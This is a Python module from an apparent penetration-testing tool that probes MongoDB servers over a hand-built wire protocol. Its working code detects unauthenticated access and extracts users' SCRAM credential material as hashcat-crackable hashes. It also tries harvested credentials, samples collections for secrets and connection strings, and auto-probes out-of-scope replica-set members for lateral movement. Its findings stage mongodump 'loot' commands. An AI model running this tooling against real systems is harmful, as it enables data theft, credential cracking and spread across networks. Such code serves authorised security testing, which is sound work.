"""Deep MongoDB enumeration (stdlib only).

MongoDB wire protocol (OP_MSG, opcode 2013) with a minimal BSON encoder/decoder,
hand-rolled on a raw socket - no pymongo. Airgapped, stdlib only.

  * **hello / buildInfo:** version, replica-set role (always answerable).
  * **listDatabases WITHOUT authentication:** the discriminator. If it returns the
    database list, the instance is exposed unauthenticated - anyone on the network
    reads (and usually writes) every database. If it errors "not authorized", auth is
    enforced (recce reports it reachable-but-locked, not a finding).

Positive findings fold into the severity totals, the Vulnerabilities sheet, the
write-ups, a dedicated **MongoDB** tab, and the prove engine.
"""
from __future__ import annotations

import re
import socket
import struct

from .models import Host, Port
from .svccommon import finding_builder, recvn as _recvn

_PORTS = (27017, 27018, 27019)
_DEFAULT_PORT = 27017
_TIMEOUT = 5.0
_MAX_BSON_DEPTH = 100                                  # real replies nest a few levels;
                                                       # anything deeper is hostile.


def is_mongodb(port: Port) -> bool:
    if port.portid in _PORTS:
        return True
    return "mongo" in f"{port.service} {port.product}".lower()


# --- minimal BSON ---------------------------------------------------------------

def _cstr(s: str) -> bytes:
    return s.encode("utf-8") + b"\x00"


def _e_int32(name: str, v: int) -> bytes:
    return b"\x10" + _cstr(name) + struct.pack("<i", v)


def _e_str(name: str, v: str) -> bytes:
    b = v.encode("utf-8") + b"\x00"
    return b"\x02" + _cstr(name) + struct.pack("<i", len(b)) + b


def _e_bool(name: str, v: bool) -> bytes:
    return b"\x08" + _cstr(name) + (b"\x01" if v else b"\x00")


def _e_binary(name: str, v: bytes) -> bytes:
    return b"\x05" + _cstr(name) + struct.pack("<i", len(v)) + b"\x00" + v


def bson_doc(*elements: bytes) -> bytes:
    body = b"".join(elements)
    return struct.pack("<i", len(body) + 5) + body + b"\x00"


def bson_parse(data: bytes, i: int = 0, _depth: int = 0) -> tuple[dict, int]:
    """Parse a BSON document at offset i. Returns (dict, index-after-document).
    Hardened against a hostile/corrupt document: a negative or non-advancing length
    field is rejected instead of spinning the loop forever, and nesting is capped so
    a maliciously deep document can't blow the Python stack with a RecursionError
    that the caller (command) doesn't catch."""
    length = struct.unpack_from("<i", data, i)[0]
    if length < 5:                                     # a BSON doc is >= 5 bytes
        return {}, i + 4
    end = min(i + length, len(data))
    if _depth > _MAX_BSON_DEPTH:                        # refuse hostile nesting depth
        return {}, end
    i += 4
    out: dict = {}
    while i < end - 1:
        etype = data[i]
        i += 1
        j = data.index(0, i)
        name = data[i:j].decode("utf-8", "replace")
        i = j + 1
        if etype == 0x01:                              # double
            out[name] = struct.unpack_from("<d", data, i)[0]
            i += 8
        elif etype == 0x02:                            # string
            slen = struct.unpack_from("<i", data, i)[0]
            i += 4
            if slen < 1:                               # reject negative/zero -> no loop stall
                break
            out[name] = data[i:i + slen - 1].decode("utf-8", "replace")
            i += slen
        elif etype == 0x03:                            # embedded document
            out[name], i = bson_parse(data, i, _depth + 1)
        elif etype == 0x04:                            # array (doc with "0","1",... keys)
            sub, i = bson_parse(data, i, _depth + 1)
            # BSON arrays use decimal string keys; a hostile daemon could send
            # non-numeric ones. Sort numeric keys, keep any stragglers by insertion
            # order, rather than letting int() blow away the whole reply.
            out[name] = [sub[k] for k in sorted(sub, key=lambda x: (0, int(x))
                                                if x.isdigit() else (1, 0))]
        elif etype == 0x05:                            # binary
            blen = struct.unpack_from("<i", data, i)[0]
            if blen < 0:
                break
            out[name] = bytes(data[i + 5:i + 5 + blen])   # skip len(4) + subtype(1)
            i += 4 + 1 + blen
        elif etype == 0x07:                            # ObjectId
            out[name] = data[i:i + 12].hex()
            i += 12
        elif etype == 0x08:                            # bool
            out[name] = bool(data[i])
            i += 1
        elif etype == 0x09:                            # UTC datetime
            out[name] = struct.unpack_from("<q", data, i)[0]
            i += 8
        elif etype == 0x0A:                            # null
            out[name] = None
        elif etype == 0x10:                            # int32
            out[name] = struct.unpack_from("<i", data, i)[0]
            i += 4
        elif etype == 0x11:                            # timestamp
            out[name] = struct.unpack_from("<Q", data, i)[0]
            i += 8
        elif etype == 0x12:                            # int64
            out[name] = struct.unpack_from("<q", data, i)[0]
            i += 8
        else:                                          # unknown type - stop safely
            break
    return out, end


# --- OP_MSG wire ----------------------------------------------------------------

def op_msg(request_id: int, doc: bytes) -> bytes:
    body = struct.pack("<I", 0) + b"\x00" + doc        # flagBits=0, section kind 0 (body)
    header = struct.pack("<iiii", 16 + len(body), request_id, 0, 2013)
    return header + body




def command(sock, doc: bytes, request_id: int, timeout: float) -> dict | None:
    """Send one OP_MSG command, return the parsed BSON reply (or None)."""
    try:
        sock.sendall(op_msg(request_id, doc))
        sock.settimeout(timeout)
        hdr = _recvn(sock, 4)
        if len(hdr) < 4:
            return None
        length = struct.unpack("<i", hdr)[0]
        if length < 5 or length > 16 * 1024 * 1024:    # sane bound; a hostile daemon
            return None                                 # can't make us buffer ~2 GB
        rest = _recvn(sock, length - 4)
        msg = hdr + rest
        # The BSON body offset depends on the reply opcode: OP_MSG (2013) has
        # header(16) + flagBits(4) + kind(1) = 21; legacy OP_REPLY (1) has a 20-byte
        # reply header after the 16-byte msg header = 36. Read the opcode (bytes
        # 12..16) instead of assuming OP_MSG so pre-3.6 servers still fingerprint.
        opcode = struct.unpack_from("<i", msg, 12)[0]
        body_at = 36 if opcode == 1 else 21
        reply, _ = bson_parse(msg, body_at)
        return reply
    except (OSError, struct.error, IndexError, ValueError):
        return None


def _hello(sock, rid, timeout):
    return command(sock, bson_doc(_e_int32("hello", 1), _e_str("$db", "admin")),
                   rid, timeout)


def _build_info(sock, rid, timeout):
    return command(sock, bson_doc(_e_int32("buildInfo", 1), _e_str("$db", "admin")),
                   rid, timeout)


def _list_databases(sock, rid, timeout):
    return command(sock, bson_doc(_e_int32("listDatabases", 1), _e_str("$db", "admin")),
                   rid, timeout)


def _cmd(sock, name, rid, timeout, db="admin"):
    return command(sock, bson_doc(_e_int32(name, 1), _e_str("$db", db)), rid, timeout)


def _scram_hashcat(username: str, mechanism: str, cred: dict) -> str:
    """Format a MongoDB SCRAM credential (from usersInfo showCredentials) as a hashcat
    line: mode 24100 for SCRAM-SHA-1 (`*0*`), mode 24200 for SCRAM-SHA-256 (`*1*`).
    Layout: $mongodb-scram$*<0|1>*<b64 user>*<iterations>*<b64 salt>*<b64 serverKey>."""
    import base64
    if not isinstance(cred, dict):
        return ""
    it = cred.get("iterationCount")
    salt = cred.get("salt")
    server_key = cred.get("serverKey")
    if not (it and salt and server_key):
        return ""
    mode = "1" if "256" in mechanism else "0"
    ub = base64.b64encode(username.encode()).decode()
    return f"$mongodb-scram$*{mode}*{ub}*{it}*{salt}*{server_key}"


def _mongo_scram(sock, user: str, password: str, mechanism: str, rid: int,
                 timeout: float) -> bool:
    """One SCRAM conversation (saslStart -> saslContinue*) on `sock`. Returns True on a
    completed, mutually-verified authentication. Never raises."""
    from . import scram
    try:
        pw = scram.mongo_sha1_secret(user, password) if "SHA-1" in mechanism else password
        client = scram.ScramClient(user, pw, mechanism)
        first = client.first_message().encode()
        r = command(sock, bson_doc(
            _e_int32("saslStart", 1), _e_str("mechanism", mechanism),
            _e_binary("payload", first), _e_int32("autoAuthorize", 1),
            _e_str("$db", "admin")), rid, timeout)
        if not isinstance(r, dict) or r.get("ok") != 1.0:
            return False
        conv = r.get("conversationId")
        server_first = (r.get("payload") or b"")
        final = client.final_message(server_first.decode("utf-8", "replace")).encode()
        r2 = command(sock, bson_doc(
            _e_int32("saslContinue", 1), _e_int32("conversationId", int(conv or 0)),
            _e_binary("payload", final), _e_str("$db", "admin")), rid + 1, timeout)
        if not isinstance(r2, dict) or r2.get("ok") != 1.0:
            return False
        if not client.verify((r2.get("payload") or b"").decode("utf-8", "replace")):
            return False
        if r2.get("done"):
            return True
        r3 = command(sock, bson_doc(
            _e_int32("saslContinue", 1), _e_int32("conversationId", int(conv or 0)),
            _e_binary("payload", b""), _e_str("$db", "admin")), rid + 2, timeout)
        return isinstance(r3, dict) and r3.get("ok") == 1.0 and bool(r3.get("done"))
    except (ValueError, KeyError, struct.error):
        return False


def authenticate(ip: str, port: int = _DEFAULT_PORT, user: str = "", password: str = "",
                 timeout: float = _TIMEOUT) -> bool:
    """Try one credential against MongoDB (SCRAM-SHA-256 then SCRAM-SHA-1). No data is
    read; the socket is dropped after the handshake completes."""
    for mech in ("SCRAM-SHA-256", "SCRAM-SHA-1"):
        try:
            with socket.create_connection((ip, port), timeout=timeout) as s:
                if _mongo_scram(s, user, password, mech, 20, timeout):
                    return True
        except OSError:
            return False
    return False


def probe_creds(ip: str, port: int, user: str, password: str,
                timeout: float = _TIMEOUT) -> dict:
    """Credentialed probe: authenticate, then run the same deep enumeration as the
    unauth path. Returns {reachable, cred_access, cred_user, version, databases, users,
    hashes, ...} or {} if unreachable."""
    out: dict = {"reachable": False, "cred_access": False, "cred_user": user}
    try:
        with socket.create_connection((ip, port), timeout=timeout) as s:
            hello = _hello(s, 1, timeout)
            if not isinstance(hello, dict) or "maxWireVersion" not in hello:
                return {}
            out["reachable"] = True
            if not _mongo_scram(s, user, password, "SCRAM-SHA-256", 20, timeout) and \
                    not _mongo_scram(s, user, password, "SCRAM-SHA-1", 30, timeout):
                return out
            out["cred_access"] = True
            bi = _build_info(s, 40, timeout)
            out["version"] = (bi or {}).get("version", "")
            out["js_engine"] = (bi or {}).get("javascriptEngine", "")
            ld = _list_databases(s, 41, timeout)
            if isinstance(ld, dict) and isinstance(ld.get("databases"), list):
                out["databases"] = [{"name": d.get("name", ""),
                                     "size": d.get("sizeOnDisk", 0)}
                                    for d in ld["databases"] if isinstance(d, dict)]
            _deep_mongo(s, out, timeout)
    except OSError:
        return out
    return out


def _flatten(doc, prefix: str = "", depth: int = 0):
    """Yield (dotted_field_name, value) for a BSON doc, descending into subdocuments."""
    if depth > 6 or not isinstance(doc, dict):
        return
    for k, v in doc.items():
        key = f"{prefix}.{k}" if prefix else k
        if isinstance(v, dict):
            yield from _flatten(v, key, depth + 1)
        else:
            yield key, v


def _batch(cursor_field):
    """listCollections/find return cursor.firstBatch, which bson_parse renders as a dict
    with numeric keys (arrays) or a list. Normalize to a list of dicts."""
    if isinstance(cursor_field, dict):
        return [v for v in cursor_field.values() if isinstance(v, dict)]
    if isinstance(cursor_field, list):
        return [v for v in cursor_field if isinstance(v, dict)]
    return []


def datamine(ip: str, port: int, dbs: list[str], timeout: float = _TIMEOUT,
             user: str | None = None, password: str | None = None,
             max_dbs: int = 6, max_colls: int = 12, max_docs: int = 3) -> dict:
    """Read-only secret hunting across the accessible databases: list collections, sample
    a few documents, flag fields whose name denotes secrets/PII (sampled REDACTED), and
    harvest embedded connection strings. Uses SCRAM auth when creds are supplied."""
    from .postgres import _CONNSTR, _SECRET_COL, _redact
    out = {"secret_fields": [], "samples": [], "harvested": []}
    try:
        with socket.create_connection((ip, port), timeout=timeout) as s:
            s.settimeout(timeout)
            if not isinstance(_hello(s, 1, timeout), dict):
                return out
            if user and not _mongo_scram(s, user, password, "SCRAM-SHA-256", 50, timeout) \
                    and not _mongo_scram(s, user, password, "SCRAM-SHA-1", 60, timeout):
                return out
            rid = 100
            for db in [d for d in dbs if d not in ("local", "config")][:max_dbs]:
                lc = command(s, bson_doc(_e_int32("listCollections", 1),
                                         _e_str("$db", db)), rid, timeout)
                rid += 1
                colls = [c.get("name", "") for c in _batch(
                    (lc or {}).get("cursor", {}).get("firstBatch"))]
                for coll in [c for c in colls
                             if c and not c.startswith("system.")][:max_colls]:
                    fr = command(s, bson_doc(_e_str("find", coll),
                                             _e_int32("limit", max_docs),
                                             _e_str("$db", db)), rid, timeout)
                    rid += 1
                    if not isinstance(fr, dict):
                        continue
                    docs = _batch(fr.get("cursor", {}).get("firstBatch"))
                    hit, sample = [], {}
                    for doc in docs:
                        for field, val in _flatten(doc):
                            if _SECRET_COL.search(field):
                                if field not in sample:
                                    hit.append(field)
                                    sample[field] = _redact(val)
                            for m in _CONNSTR.finditer(str(val or "")):
                                out["harvested"].append(m.group(0))
                    for f in hit:
                        out["secret_fields"].append(
                            {"db": db, "collection": coll, "field": f})
                    if sample:
                        keys = list(sample)[:6]
                        out["samples"].append({
                            "db": db, "collection": coll, "fields": keys,
                            "redacted": {k: sample[k] for k in keys}})
    except OSError:
        pass
    seen: set = set()
    out["harvested"] = [c for c in out["harvested"]
                        if not (c in seen or seen.add(c))]
    return out


def _deep_mongo(sock, out: dict, timeout: float) -> None:
    """Read-only deep enumeration on an unauthenticated MongoDB: captured user accounts
    (+ credential mechanisms), replica-set members (lateral targets), and the on-disk
    config (whether auth is even configured). Populates out[users|replset|replset_members
    |auth_configured|bind_ip|js_engine]. Never raises."""
    # usersInfo on admin with showCredentials: dump accounts, roles AND the SCRAM
    # key material (salt/iterations/serverKey) -> crackable hashcat lines.
    ui = command(sock, bson_doc(_e_int32("usersInfo", 1), _e_bool("showCredentials", True),
                                _e_str("$db", "admin")), 10, timeout)
    users, hashes = [], []
    if isinstance(ui, dict) and isinstance(ui.get("users"), list):
        for u in ui["users"]:
            if not isinstance(u, dict):
                continue
            creds = u.get("credentials")
            mechs = list(creds.keys()) if isinstance(creds, dict) else []
            roles = [r.get("role", "") for r in u.get("roles", [])
                     if isinstance(r, dict)]
            uname = u.get("user", "")
            users.append({"user": uname, "db": u.get("db", ""),
                          "roles": roles, "mechanisms": mechs})
            if isinstance(creds, dict):
                for mech, c in creds.items():
                    hc = _scram_hashcat(uname, mech, c)
                    if hc:
                        hashes.append({"user": uname, "mechanism": mech, "hashcat": hc})
    out["users"] = users
    out["hashes"] = hashes
    # replSetGetStatus: replica-set members are additional lateral targets.
    rs = _cmd(sock, "replSetGetStatus", 11, timeout)
    if isinstance(rs, dict) and rs.get("ok") == 1.0:
        out["replset"] = rs.get("set", "")
        out["replset_members"] = [m.get("name", "") for m in rs.get("members", [])
                                  if isinstance(m, dict)]
    # getCmdLineOpts: is authentication even configured? what interface is it bound to?
    opts = _cmd(sock, "getCmdLineOpts", 12, timeout)
    if isinstance(opts, dict) and isinstance(opts.get("parsed"), dict):
        parsed = opts["parsed"]
        sec = parsed.get("security") if isinstance(parsed.get("security"), dict) else {}
        out["auth_configured"] = bool(sec.get("authorization") == "enabled")
        net = parsed.get("net") if isinstance(parsed.get("net"), dict) else {}
        out["bind_ip"] = str(net.get("bindIp", ""))


# --- probe ----------------------------------------------------------------------

def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT) -> dict | None:
    """Unauthenticated MongoDB probe. Returns None if the port didn't speak MongoDB."""
    try:
        with socket.create_connection((ip, port), timeout=timeout) as s:
            hello = _hello(s, 1, timeout)
            if not isinstance(hello, dict) or "maxWireVersion" not in hello:
                return None                            # not MongoDB
            out = {"ip": ip, "port": port,
                   "primary": bool(hello.get("isWritablePrimary")
                                   or hello.get("ismaster")),
                   "set_name": hello.get("setName", ""),
                   "max_wire": hello.get("maxWireVersion")}
            bi = _build_info(s, 2, timeout)
            out["version"] = (bi or {}).get("version", "")
            out["js_engine"] = (bi or {}).get("javascriptEngine", "")
            ld = _list_databases(s, 3, timeout)
            if isinstance(ld, dict) and ld.get("ok") == 1.0 and "databases" in ld:
                out["unauth"] = True
                out["databases"] = [{"name": d.get("name", ""),
                                     "size": d.get("sizeOnDisk", 0)}
                                    for d in ld["databases"] if isinstance(d, dict)]
                out["total_size"] = ld.get("totalSize", 0)
                _deep_mongo(s, out, timeout)
            else:
                out["unauth"] = False
                out["auth_error"] = (ld or {}).get("errmsg", "") if isinstance(ld, dict) else ""
            return out
    except OSError:
        return None


def mongodb_targets(hosts: list[Host]) -> list[dict]:
    out = []
    for h in hosts:
        for p in h.open_ports:
            if is_mongodb(p):
                out.append({"ip": h.ip, "hostname": h.hostname, "port": p.portid,
                            "product": p.product or "", "version": p.version or ""})
    return out


# --- narratives + findings ------------------------------------------------------

_NARRATIVE = {
    "mongo_unauth": (
        "The MongoDB instance accepts commands with no authentication - recce listed "
        "every database without a credential. That means full read (and, by default, "
        "write) access to all data: dump collections, exfiltrate PII/secrets, tamper "
        "with or ransom the data. This is one of the most common and highest-impact "
        "internet/intranet exposures. Enable authentication (--auth) and bind the "
        "listener to a trusted interface immediately."),
    "mongo_version": (
        "The MongoDB build is old / end-of-life. Beyond the missing security fixes, "
        "pre-2.6 defaults exposed the HTTP/REST interfaces and pre-3.0 shipped with no "
        "authentication out of the box - confirm the running config and upgrade."),
}


TESTING_NARRATIVE = [
    ("1. Handshake (stdlib OP_MSG / BSON)",
     "recce speaks the MongoDB wire protocol directly - no pymongo. It sends hello + "
     "buildInfo to read the version and replica-set role."),
    ("2. Unauthenticated access test",
     "It runs listDatabases with no credential. If the database list comes back, the "
     "instance is exposed unauthenticated (critical); an 'authorized' error means auth "
     "is enforced (reachable but locked - not a finding)."),
    ("3. Vulnerability identification",
     "An unauthenticated instance is a CONFIRMED critical exposure with the database "
     "inventory captured. An old/EOL build is flagged for its default-open history."),
    ("4. Runbook",
     "The exact follow-on commands (mongosh, mongodump, nmap mongodb-databases) are "
     "staged per endpoint."),
]


_finding = finding_builder("mongodb", _NARRATIVE)


def _old_version(ver: str) -> bool:
    try:
        major = int(ver.split(".")[0])
        return major < 4
    except (ValueError, IndexError):
        return False


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if not is_mongodb(p):
                continue
            pr = probes.get((h.ip, p.portid)) or {}
            if not pr:
                continue
            tgt = f"{h.ip}:{p.portid}"
            ver = pr.get("version", "")
            if pr.get("unauth"):
                dbs = pr.get("databases") or []
                names = ", ".join(d["name"] for d in dbs[:12])
                # Deeper: accounts, replica-set topology and config captured read-only.
                extra = ""
                users = pr.get("users") or []
                hashes = pr.get("hashes") or []
                if users:
                    named = ", ".join(u["user"] for u in users[:8] if u.get("user"))
                    extra += (f"\n\nCAPTURED {len(users)} user account(s) via usersInfo"
                              + (f": {named}" if named else "")
                              + (f"; {len(hashes)} crackable SCRAM hash(es) extracted "
                                 "(hashcat -m 24100/24200)" if hashes else
                                 " (roles + credential mechanisms; privilege map)")
                              + ".")
                members = pr.get("replset_members") or []
                if members:
                    extra += (f"\n\nReplica set '{pr.get('replset', '')}' - "
                              f"{len(members)} member(s) (lateral targets): "
                              + ", ".join(members[:6]) + ".")
                if pr.get("auth_configured") is False:
                    extra += ("\n\ngetCmdLineOpts confirms authentication is NOT "
                              "configured (security.authorization absent)"
                              + (f"; bound to {pr.get('bind_ip')}" if pr.get("bind_ip") else "")
                              + ".")
                if pr.get("js_engine"):
                    extra += (f"\n\nServer-side JavaScript engine: {pr['js_engine']} "
                              "($where / mapReduce available for query-side code exec).")
                out.append(_finding(
                    "critical", "MongoDB exposed without authentication", tgt,
                    f"recce listed {len(dbs)} database(s) with no credential"
                    + (f" (version {ver})" if ver else "") + f": {names}. Full "
                    "unauthenticated read/write access to all data." + extra,
                    "mongosh / mongodump",
                    f"mongosh mongodb://{h.ip}:{p.portid}/ --eval 'db.adminCommand("
                    "{usersInfo:1})'   # then mongodump --host "
                    f"{h.ip} --port {p.portid} --out loot/",
                    "Enable authentication (security.authorization: enabled), create "
                    "admin users, and bind the listener to a trusted interface only.",
                    ["CWE-306", "CWE-284"], kind="mongo_unauth"))
            elif pr.get("cred_access"):
                dbs = pr.get("databases") or []
                who = pr.get("cred_user", "?")
                users = pr.get("users") or []
                hashes = pr.get("hashes") or []
                extra = ""
                if users:
                    extra += (f" Enumerated {len(users)} account(s)"
                              + (f"; {len(hashes)} SCRAM hash(es) extracted (hashcat "
                                 "-m 24100/24200)" if hashes else "") + ".")
                out.append(_finding(
                    "high", "MongoDB credentialed access (looted / weak credential)", tgt,
                    f"recce authenticated as '{who}' (SCRAM) with a credential from the "
                    "engagement"
                    + (f" (version {ver})" if ver else "")
                    + f" and read {len(dbs)} database(s)." + extra,
                    "mongosh",
                    f"mongosh 'mongodb://{who}:<pass>@{h.ip}:{p.portid}/?authSource=admin' "
                    "--eval 'db.adminCommand({usersInfo:1,showCredentials:true})'",
                    "Rotate the credential; enforce least privilege / SCRAM-SHA-256; bind "
                    "to a trusted interface.",
                    ["CWE-522", "CWE-284"], kind="mongo_cred_access"))
            dm = pr.get("datamine")
            if dm and dm.get("secret_fields"):
                sf = dm["secret_fields"]
                colls = sorted({f"{c['db']}.{c['collection']}" for c in sf})
                detail = (f"recce mined {len(sf)} sensitive field(s) across "
                          f"{len(colls)} collection(s): "
                          + ", ".join(f"{c['collection']}.{c['field']}" for c in sf[:12])
                          + (" …" if len(sf) > 12 else "") + ".")
                samples = dm.get("samples") or []
                if samples:
                    s = samples[0]
                    detail += ("\n\nSAMPLE (redacted) " + s["db"] + "." + s["collection"]
                               + ": " + ", ".join(f"{k}={v}"
                                                  for k, v in s["redacted"].items()))
                harvested = dm.get("harvested") or []
                if harvested:
                    detail += (f"\n\nHARVESTED {len(harvested)} connection string(s) -> "
                               "spray set: "
                               + ", ".join(re.sub(r":[^:@/]+@", ":****@", c)
                                           for c in harvested[:5]))
                out.append(_finding(
                    "high", "MongoDB sensitive data exposed (PII / secrets / credentials)",
                    tgt, detail, "mongosh",
                    f"mongosh mongodb://{h.ip}:{p.portid}/ --eval "
                    "'db.getSiblingDB(\"<db>\").<collection>.find().limit(20)'   # full docs (ROE)",
                    "Encrypt sensitive fields; least-privilege the app role; remove "
                    "embedded credentials; bind to a trusted interface.",
                    ["CWE-200", "CWE-312"], kind="mongo_datamine"))
            if ver and _old_version(ver):
                out.append(_finding(
                    "medium", "MongoDB end-of-life / legacy build", tgt,
                    f"MongoDB {ver} is past end-of-life - missing security fixes, and the "
                    "pre-3.0 line shipped auth-off by default.",
                    "mongosh",
                    f"mongosh mongodb://{h.ip}:{p.portid}/ --eval 'db.version()'",
                    "Upgrade to a supported MongoDB release.",
                    ["CWE-1104"], kind="mongo_version"))
    return out


# --- runbook + proof + analyze --------------------------------------------------

def runbook(ip: str, port: int) -> list[dict]:
    steps = [
        ("recon", "nmap NSE", f"nmap -p{port} --script mongodb-info,mongodb-databases "
         f"{ip}", "Server info + database list (confirms unauth)."),
        ("enumerate", "mongosh", f"mongosh mongodb://{ip}:{port}/ --eval "
         "'db.adminCommand({listDatabases:1})'", "List databases without credentials."),
        ("loot", "mongodump", f"mongodump --host {ip} --port {port} --out loot/mongo/",
         "Dump every database to disk for offline analysis."),
    ]
    return [{"phase": ph, "tool": t, "command": c, "why": w}
            for ph, t, c, w in steps]


def proof_html(command, output, banner: str = "") -> str:
    from . import mssql
    return mssql.proof_html(command, output, prompt="> ", banner=banner)


def findings_to_vulns(fs: list[dict]) -> dict:
    from .svccommon import findings_to_vulns as _f2v
    return _f2v(fs, "mongodb", _DEFAULT_PORT)


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            budget: float | None = None, progress=None) -> dict:
    """Full MongoDB analysis. Returns {targets, findings, runbooks, probes, stats}.
    `budget` caps wall-clock seconds; `progress(i, n, target)` fires per probe."""
    from . import svcprobe
    from .models import Credential
    from .postgres import _cred_list
    targets = mongodb_targets(hosts)
    probes: dict = {}
    state: dict = {}
    looted: list = []
    discovered: list = []                     # (host:port, user, pw) replica members
    if active:
        for t, pr in svcprobe.iter_probe(
                targets, lambda t: probe(t["ip"], t["port"]),
                budget=budget, progress=progress, state=state):
            if not pr:
                continue
            # Credentialed follow-through: a reachable-but-locked instance is retried
            # with each supplied/looted credential (SCRAM-SHA-256/1).
            acc_user, acc_pw = None, None
            if not pr.get("unauth"):
                for u, pw in _cred_list(creds):
                    cp = probe_creds(t["ip"], t["port"], u, pw)
                    if cp.get("cred_access"):
                        pr = cp
                        acc_user, acc_pw = u, pw
                        break
            probes[(t["ip"], t["port"])] = pr
            t["unauth"] = pr.get("unauth", False)
            t["cred_access"] = pr.get("cred_access", False)
            t["version"] = pr.get("version", "")
            t["databases"] = len(pr.get("databases") or [])
            for m in (pr.get("replset_members") or []):
                discovered.append((m, acc_user, acc_pw))
            # Exfil: mine collections for sensitive fields + embedded creds.
            if pr.get("unauth") or pr.get("cred_access"):
                dbnames = [d["name"] for d in pr.get("databases", []) if d.get("name")]
                dm = datamine(t["ip"], t["port"], dbnames, user=acc_user, password=acc_pw)
                pr["datamine"] = dm
                for cs in dm.get("harvested", []):
                    looted.append(Credential(
                        username="(embedded)", secret=cs, kind="password",
                        source="mongodb-datamine", origin_ip=t["ip"],
                        notes=f"connection string mined from MongoDB :{t['port']}"))
            for hh in pr.get("hashes", []):
                looted.append(Credential(
                    username=hh["user"], secret=hh["hashcat"], kind="hash",
                    source="mongodb-loot", origin_ip=t["ip"],
                    notes=f"MongoDB SCRAM {hh['mechanism']} (hashcat "
                          f"{'24200' if '256' in hh['mechanism'] else '24100'}) :{t['port']}"))
    fs = findings(hosts, probes)
    # Lateral: auto-probe the replica-set members (additional MongoDB hosts the set
    # advertised) that aren't already in scope - they usually share the exposure/creds.
    if active and discovered:
        fs.extend(_probe_members(discovered, targets, creds))
    runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                 "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
                for t in targets]
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "credentials": looted,
            "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
            "stats": {"targets": len(targets), "findings": len(fs),
                      "credentials": len(looted), "stopped": state.get("stopped")}}


def _probe_members(discovered: list, targets: list, creds, max_members: int = 8) -> list:
    """Probe replica-set members not already in scope. Returns finding dicts for each
    that is reachable AND accessible (unauth or the same working credential)."""
    from .postgres import _cred_list
    known = {(t["ip"], t["port"]) for t in targets}
    seen: set = set()
    out: list = []
    for member, mu, mpw in discovered:
        if len(seen) >= max_members:
            break
        host, _sep, mp = member.rpartition(":")
        if not host:
            host, mp = member, str(_DEFAULT_PORT)
        portn = int(mp) if mp.isdigit() else _DEFAULT_PORT
        key = (host, portn)
        if key in known or key in seen:
            continue
        seen.add(key)
        pr = probe(host, portn)
        used = None
        if isinstance(pr, dict) and not pr.get("unauth"):
            for u, pw in ([(mu, mpw)] if mu else []) + _cred_list(creds):
                if not u:
                    continue
                cp = probe_creds(host, portn, u, pw)
                if cp.get("cred_access"):
                    pr, used = cp, u
                    break
        if not isinstance(pr, dict) or not (pr.get("unauth") or pr.get("cred_access")):
            continue
        access = ("no authentication" if pr.get("unauth")
                  else f"the harvested credential '{used}'")
        dbs = pr.get("databases") or []
        out.append(_finding(
            "high", f"MongoDB replica-set member exposed ({host}:{portn})",
            f"{host}:{portn}",
            f"The replica set advertised member {host}:{portn}; recce reached it with "
            f"{access}" + (f" (version {pr.get('version')})" if pr.get("version") else "")
            + f" and read {len(dbs)} database(s). Lateral movement: the same exposure / "
            "credential covers every node in the set.",
            "mongosh", f"mongosh mongodb://{host}:{portn}/ --eval "
            "'db.adminCommand({listDatabases:1})'   # then run `recce enum` on this host",
            "Secure every replica-set member identically; bind to a trusted interface; "
            "require SCRAM auth.",
            ["CWE-306", "CWE-284"], kind="mongo_replica_member"))
    return out
